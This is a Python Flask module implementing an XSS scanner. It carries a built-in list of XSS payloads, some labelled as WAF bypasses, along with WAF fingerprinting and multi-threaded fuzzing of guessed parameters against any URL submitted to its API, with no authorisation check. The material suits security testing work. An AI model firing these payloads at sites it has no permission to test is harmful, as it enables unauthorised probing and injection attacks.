#!/usr/bin/env python3
"""
Professional XSS Scanner Engine - Khan Tool
Real working XSS detection with multi-threading, WAF detection, context analysis
"""

import re
import time
import hashlib
import socket
import random
import string
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

import requests
from bs4 import BeautifulSoup
from flask import Blueprint, request, jsonify

# ============================================================
# BLUEPRINT SETUP
# ============================================================
xss_bp = Blueprint('xss_scanner', __name__, url_prefix='')

# ============================================================
# DEFAULT XSS PAYLOADS (Real working collection)
# ============================================================
DEFAULT_PAYLOADS = [
    # Basic reflected
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<ScRiPt>alert(1)</ScRiPt>",
    
    # Attribute based
    "\" onfocus=alert(1) autofocus=\"",
    "' onfocus=alert(1) autofocus='",
    "\" onmouseover=alert(1) x=\"",
    "\" onclick=alert(1) x=\"",
    
    # JavaScript context
    "';alert(1);//",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",
    "${alert(1)}",
    
    # URL/javascript protocol
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    
    # Encoded/WAF bypass
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<img/src=x/onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    
    # Event handlers
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
]

# WAF detection signatures
WAF_SIGNATURES = {
    'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
    'ModSecurity': ['ModSecurity', 'mod_security'],
    'AWS WAF': ['x-amzn-RequestId', 'awswaf'],
    'Sucuri': ['Sucuri', 'sucuri'],
}

# ============================================================
# XSS SCANNER ENGINE
# ============================================================
class XSSScanner:
    def __init__(self, target_url, custom_payloads=None):
        self.target_url = target_url.rstrip('/')
        self.parsed = urlparse(self.target_url)
        self.custom_payloads = custom_payloads or []
        
        # Session setup
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
        
        # State
        self.baseline = None
        self.parameters = []
        self.vulnerabilities = []
        self.waf_detected = None
        self.scan_logs = []
        
    def log(self, msg, level='info'):
        timestamp = time.strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {msg}"
        self.scan_logs.append({'time': timestamp, 'level': level, 'message': msg})
        print(log_entry)
    
    # ============================================================
    # PHASE 1: Baseline & Connectivity
    # ============================================================
    def establish_baseline(self):
        """Check if target is reachable and establish baseline response"""
        self.log("[1/5] Checking target connectivity...")
        
        # DNS Resolution
        hostname = self.parsed.hostname
        if not hostname:
            return False, "Invalid hostname"
        
        try:
            ip = socket.gethostbyname(hostname)
            self.log(f"  ✓ DNS resolved: {hostname} → {ip}")
        except Exception as e:
            return False, f"DNS resolution failed: {e}"
        
        # TCP Port check
        port = self.parsed.port or (443 if self.parsed.scheme == 'https' else 80)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((hostname, port))
            sock.close()
            if result != 0:
                return False, f"Port {port} is closed/unreachable"
            self.log(f"  ✓ Port {port}: open")
        except Exception as e:
            return False, f"Port check failed: {e}"
        
        # HTTP Request
        try:
            resp = self.session.get(self.target_url, timeout=15, allow_redirects=True)
            self.baseline = {
                'status_code': resp.status_code,
                'content_length': len(resp.text),
                'response_time': resp.elapsed.total_seconds(),
                'headers': dict(resp.headers),
                'body': resp.text,
            }
            self.log(f"  ✓ HTTP {resp.status_code} | {len(resp.text)} bytes | {resp.elapsed.total_seconds():.2f}s")
            return True, None
        except requests.exceptions.Timeout:
            return False, "Request timeout - target slow or unresponsive"
        except requests.exceptions.ConnectionError:
            return False, "Connection error - target refused connection"
        except Exception as e:
            return False, f"HTTP error: {str(e)[:100]}"
    
    # ============================================================
    # PHASE 2: WAF Detection
    # ============================================================
    def detect_waf(self):
        """Detect WAF by sending malicious probe"""
        self.log("[2/5] Detecting WAF...")
        
        probe_payload = "<script>alert(1)</script>"
        test_url = self.target_url
        if '?' in test_url:
            test_url += '&xss_test=' + probe_payload
        else:
            test_url += '?xss_test=' + probe_payload
        
        try:
            resp = self.session.get(test_url, timeout=10)
            
            # Check headers for WAF signatures
            headers_str = str(resp.headers).lower()
            for waf_name, signatures in WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in headers_str:
                        self.waf_detected = waf_name
                        self.log(f"  ⚠️ WAF detected: {waf_name}", 'warning')
                        return waf_name
            
            # Check for block page indicators
            block_keywords = ['blocked', 'forbidden', 'access denied', 'security check']
            body_lower = resp.text[:2000].lower()
            for keyword in block_keywords:
                if keyword in body_lower:
                    self.waf_detected = "Unknown WAF (block page)"
                    self.log(f"  ⚠️ Block page detected", 'warning')
                    return self.waf_detected
            
            self.log("  ✓ No WAF detected")
            return None
            
        except Exception as e:
            self.log(f"  WAF detection error: {e}", 'warning')
            return None
    
    # ============================================================
    # PHASE 3: Parameter Discovery
    # ============================================================
    def discover_parameters(self):
        """Discover URL parameters and common web parameters"""
        self.log("[3/5] Discovering parameters...")
        
        params = set()
        
        # Extract from URL
        qs = parse_qs(self.parsed.query)
        for key in qs:
            params.add(key)
        
        # Common web parameters to test
        common_params = [
            'q', 's', 'search', 'id', 'page', 'p', 'cat', 'category', 'product',
            'item', 'article', 'post', 'view', 'action', 'file', 'name', 'title',
            'msg', 'message', 'comment', 'text', 'body', 'keyword', 'query',
            'callback', 'jsonp', 'format', 'type', 'lang', 'redirect', 'url',
            'user', 'email', 'username', 'password', 'token', 'hash', '_'
        ]
        
        for param in common_params:
            if param not in params:
                params.add(param)
        
        self.parameters = list(params)
        self.log(f"  ✓ Found {len(self.parameters)} parameter(s) to test")
        return self.parameters
    
    # ============================================================
    # PHASE 4: Build Payload Set
    # ============================================================
    def build_payloads(self):
        """Build complete payload set with mutations"""
        self.log("[4/5] Building payload set...")
        
        payloads = []
        
        # Add default payloads
        payloads.extend(DEFAULT_PAYLOADS)
        
        # Add custom payloads
        if self.custom_payloads:
            payloads.extend(self.custom_payloads)
        
        # Generate mutations (case variations)
        mutations = []
        for p in payloads[:20]:  # Mutate first 20 payloads
            # Case mutation for script tag
            if '<script>' in p.lower():
                mutations.append(p.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'))
            # Add whitespace variations
            if 'onerror=' in p.lower():
                mutations.append(p.replace('onerror=', 'onerror ='))
                mutations.append(p.replace('onerror=', 'onerror\t='))
        
        payloads.extend(mutations)
        
        # Deduplicate
        unique = list(dict.fromkeys(payloads))
        self.log(f"  ✓ Generated {len(unique)} unique payloads")
        return unique
    
    # ============================================================
    # PHASE 5: Fuzzing (Multi-threaded)
    # ============================================================
    def test_payload(self, param, payload):
        """Test a single payload on a parameter"""
        # Build test URL
        qs = parse_qs(self.parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}"
        if new_query:
            test_url += '?' + new_query
        
        try:
            resp = self.session.get(test_url, timeout=10)
            body = resp.text
            
            # Check if payload is reflected
            if payload not in body:
                # Also check HTML encoded version
                encoded = payload.replace('"', '&quot;').replace("'", "&#39;").replace('<', '&lt;').replace('>', '&gt;')
                if encoded in body:
                    return None  # Encoded = safe
                return None
            
            # Determine context and confidence
            confidence = 'low'
            vuln_type = 'Reflected XSS'
            
            # Check for HTML tag injection (high confidence)
            if '<script>' in payload and '<script>' in body:
                confidence = 'high'
                vuln_type = 'Reflected XSS (Script Injection)'
            elif 'onerror=' in payload and 'onerror=' in body:
                confidence = 'high'
                vuln_type = 'Reflected XSS (Event Handler)'
            elif '<img' in payload and '<img' in body:
                confidence = 'high'
                vuln_type = 'Reflected XSS (HTML Injection)'
            # Check if inside JavaScript context
            elif "';alert" in payload or '";alert' in payload:
                # Check if it broke out of quotes
                if 'alert' in body:
                    confidence = 'high'
                    vuln_type = 'Reflected XSS (JS Breakout)'
            else:
                confidence = 'medium'
            
            # Extract snippet
            idx = body.find(payload)
            start = max(0, idx - 80)
            end = min(len(body), idx + len(payload) + 80)
            snippet = body[start:end]
            if start > 0:
                snippet = '...' + snippet
            if end < len(body):
                snippet = snippet + '...'
            
            return {
                'parameter': param,
                'payload': payload,
                'vulnerable': True,
                'vuln_type': vuln_type,
                'confidence': confidence,
                'status_code': resp.status_code,
                'response_length': len(body),
                'response_time': f"{resp.elapsed.total_seconds():.2f}s",
                'snippet': snippet,
                'url': test_url,
            }
            
        except requests.exceptions.Timeout:
            return None
        except Exception:
            return None
    
    def fuzz(self, payloads):
        """Multi-threaded fuzzing of all parameters"""
        self.log(f"[5/5] Fuzzing {len(payloads)} payloads across {len(self.parameters)} params...")
        
        results = []
        work_items = []
        for param in self.parameters:
            for payload in payloads:
                work_items.append((param, payload))
        
        total = len(work_items)
        self.log(f"  Total test cases: {total}")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for param, payload in work_items:
                future = executor.submit(self.test_payload, param, payload)
                futures[future] = (param, payload)
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                result = future.result()
                if result:
                    results.append(result)
                    self.log(f"  🔴 VULNERABLE: {result['parameter']} [{result['vuln_type']}]", 'vuln')
                
                if completed % max(1, total // 20) == 0:
                    self.log(f"  Progress: {completed}/{total} ({int(completed/total*100)}%)")
        
        self.vulnerabilities = results
        self.log(f"  ✓ Scan complete: {len(results)} vulnerability(ies) found")
        return results
    
    # ============================================================
    # MAIN RUN METHOD
    # ============================================================
    def run(self):
        """Execute full XSS scan pipeline"""
        result = {
            'status': 'complete',
            'target': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'phases': {},
            'vulnerabilities': [],
            'summary': {},
            'logs': [],
        }
        
        # Phase 1: Baseline
        phase_start = time.time()
        success, error = self.establish_baseline()
        if not success:
            result['status'] = 'error'
            result['message'] = error
            result['logs'] = self.scan_logs
            return result
        result['phases']['baseline'] = {'duration': f"{time.time()-phase_start:.2f}s", 'status': 'ok'}
        
        # Phase 2: WAF Detection
        phase_start = time.time()
        waf = self.detect_waf()
        result['phases']['waf_detection'] = {'duration': f"{time.time()-phase_start:.2f}s", 'waf': waf}
        
        # Phase 3: Parameter Discovery
        phase_start = time.time()
        params = self.discover_parameters()
        result['phases']['parameter_discovery'] = {'duration': f"{time.time()-phase_start:.2f}s", 'count': len(params)}
        
        # Phase 4: Build Payloads
        phase_start = time.time()
        payloads = self.build_payloads()
        result['phases']['payload_building'] = {'duration': f"{time.time()-phase_start:.2f}s", 'count': len(payloads)}
        
        # Phase 5: Fuzzing
        phase_start = time.time()
        vulns = self.fuzz(payloads)
        result['phases']['fuzzing'] = {'duration': f"{time.time()-phase_start:.2f}s", 'vulnerabilities_found': len(vulns)}
        
        # Summary
        result['vulnerabilities'] = vulns
        result['summary'] = {
            'total_vulnerabilities': len(vulns),
            'high_confidence': sum(1 for v in vulns if v.get('confidence') == 'high'),
            'medium_confidence': sum(1 for v in vulns if v.get('confidence') == 'medium'),
            'low_confidence': sum(1 for v in vulns if v.get('confidence') == 'low'),
            'by_type': dict(zip(*[list(v.keys()) for v in vulns])),
        }
        
        # Count by type
        type_counts = defaultdict(int)
        for v in vulns:
            type_counts[v.get('vuln_type', 'Unknown')] += 1
        result['summary']['by_type'] = dict(type_counts)
        
        result['logs'] = self.scan_logs
        
        return result


# ============================================================
# FLASK ROUTES
# ============================================================

@xss_bp.route('/api/xss-scan', methods=['POST'])
def xss_scan_api():
    """Main XSS scan API endpoint"""
    data = request.get_json() or {}
    target_url = data.get('url', '').strip()
    custom_payloads = data.get('payloads', [])
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'Target URL is required'}), 400
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    scanner = XSSScanner(target_url, custom_payloads)
    
    try:
        result = scanner.run()
        return jsonify(result)
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e),
            'target': target_url,
        }), 500


@xss_bp.route('/api/xss-payloads', methods=['GET'])
def get_payloads():
    """Get default payload list"""
    return jsonify({
        'total': len(DEFAULT_PAYLOADS),
        'payloads': DEFAULT_PAYLOADS,
    })